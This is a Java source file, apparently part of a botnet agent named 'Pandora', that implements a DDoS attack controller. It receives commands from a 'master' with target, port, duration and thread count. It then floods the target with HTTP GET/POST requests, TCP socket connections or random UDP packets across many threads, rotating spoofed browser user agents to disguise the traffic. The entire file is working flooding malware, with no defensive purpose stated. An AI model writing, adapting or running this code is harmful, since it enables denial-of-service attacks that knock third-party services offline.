package org.pandora.agent.control.impl;

import org.pandora.agent.utils.NumberUtils;

import java.io.IOException;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class AttackController {

    private final HashMap<String, Long> attacks;
    private final ArrayList<String> userAgents;
    private final Random random;

    public AttackController() {
        this.attacks = new HashMap<>();
        this.userAgents = new ArrayList<>();
        this.random = new Random();
        this.userAgents.addAll(new ArrayList<>(Arrays.asList("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4147.125 Safari/537.36")));
    }

    private String getAgent() {
        return this.userAgents.get(this.random.nextInt(this.userAgents.size()));
    }

    public void stopAttack(final String id, final String master) {
        if (!NumberUtils.isInteger(id) || this.attacks.get(master + "-" + id) == null) return;
        this.attacks.remove(master + "-" + id);
    }

    public void startAttack(final String id, String host, final String port, final String time, final String method, String threads, final String master) {
        if (!NumberUtils.isInteger(id) || !NumberUtils.isInteger(threads) || !NumberUtils.isInteger(port) || !NumberUtils.isInteger(time))
            return;
        host = host.replace("(doubleDot)", ":");

        this.attacks.put(master + "-" + id, System.currentTimeMillis());
        this.sendRequest(method, id, master, host, port, time, threads, method.startsWith("Lite"));
    }

    private void sendRequest(final String method, final String id, final String master, final String host, final String port, final String time, final String threads, final boolean blockThreads) {
        final ConcurrentHashMap<Object, Object> requests = new ConcurrentHashMap<>();
        while (this.attacks.get(master + "-" + id) != null && (this.attacks.get(master + "-" + id) + Integer.parseInt(time) * 1000L) >= System.currentTimeMillis()) {
            if (!blockThreads) {
                for (int i = 0; i < Integer.parseInt(threads); i++) {
                    new Thread(() -> {
                        if (this.attacks.get(master + "-" + id) != null && (this.attacks.get(master + "-" + id) + Integer.parseInt(time) * 1000L) >= System.currentTimeMillis()) {
                            switch (method) {
                                case "GET":
                                case "POST": {
                                    this.sendHttp(host, method, requests);
                                    break;
                                }
                                case "SOCKET": {
                                    this.sendSocket(host, port, requests);
                                    break;
                                }
                                case "UDP": {
                                    this.sendUdp(host, port, requests);
                                    break;
                                }
                            }
                        } else Thread.currentThread().interrupt();
                    }).start();
                }
            } else {
                switch (method) {
                    case "LiteHTTP": {
                        this.sendHttp(host, method, requests);
                        break;
                    }
                    case "LiteSocket": {
                        this.sendSocket(host, port, requests);
                        break;
                    }
                    case "LiteUDP": {
                        this.sendUdp(host, port, requests);
                        break;
                    }
                }
            }
        }
        requests.keySet().forEach(request -> {
            try {
                if (request instanceof HttpURLConnection) ((HttpURLConnection) request).disconnect();
                else if (request instanceof Socket) ((Socket) request).close();
                else if (request instanceof DatagramSocket) ((DatagramSocket) request).close();
            } catch (final IOException ignore) {
            }
            requests.remove(request);
        });
        this.attacks.remove(master + "-" + id);
    }

    private void sendUdp(final String host, final String port, final ConcurrentHashMap<Object, Object> concurrentHashMap) {
        try {
            final DatagramSocket datagramSocket = new DatagramSocket();
            datagramSocket.connect(InetAddress.getByName(host), Integer.parseInt(port));
            datagramSocket.setSoTimeout(13000);
            final byte[] bytes = new byte[this.random.nextInt(100000)];
            this.random.nextBytes(bytes);
            datagramSocket.send(new DatagramPacket(bytes, bytes.length));
            concurrentHashMap.put(datagramSocket, datagramSocket);
        } catch (final NoSuchElementException | IOException ignored) {
        }
    }

    private void sendSocket(final String host, final String port, final ConcurrentHashMap<Object, Object> concurrentHashMap) {
        try {
            final Socket socket = new Socket();
            socket.connect(new InetSocketAddress(host, Integer.parseInt(port)));
            socket.setSoTimeout(13000);
            concurrentHashMap.put(socket, socket);
        } catch (final NoSuchElementException | IOException ignored) {
        }
    }

    private void sendHttp(final String host, final String method, final ConcurrentHashMap<Object, Object> concurrentHashMap) {
        try {
            final URL url = new URL(host);
            final HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(method.equals("LiteHTTP") ? "GET" : method);
            connection.setRequestProperty("User-Agent", this.getAgent());
            connection.setConnectTimeout(13000);
            connection.connect();
            connection.getResponseCode();
            concurrentHashMap.put(connection, connection);
        } catch (final NoSuchElementException | IOException ignored) {
        }
    }
}